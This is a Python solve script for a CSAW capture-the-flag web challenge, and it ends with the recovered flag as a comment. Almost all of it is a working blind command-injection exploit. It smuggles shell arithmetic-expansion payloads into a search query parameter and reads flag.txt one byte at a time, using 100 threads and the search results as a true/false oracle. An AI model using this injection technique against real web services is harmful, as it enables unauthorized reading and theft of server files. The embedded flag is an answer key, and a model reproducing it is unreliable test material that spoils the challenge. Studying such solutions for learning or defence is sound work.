from myutils import multithread_run
import requests


def query(idx, ch):
    cmd = f"$(($(od -An -N1 -j{idx} -t uC flag.txt)=={ord(ch)}?1:1337))"
    resp = requests.get(f"https://smolder-alexandria.ctf.csaw.io/vault/search?q={cmd}")
    result = resp.json()["results"]
    return len(result) > 0


charset = [chr(i) for i in range(32, 127)]
flag = ""

while True:
    idx = len(flag)
    nextch = "\xff"


    def target(ch):
        global nextch
        if query(idx, ch):
            nextch = ch


    args_list = [(ch,) for ch in charset]
    multithread_run(target, args_list, max_threads=100)

    if nextch == "\xff":
        break
    flag += nextch
    print(flag)

# csawctf{5m0Ld3r_bUrN_1mm0l473_R463}
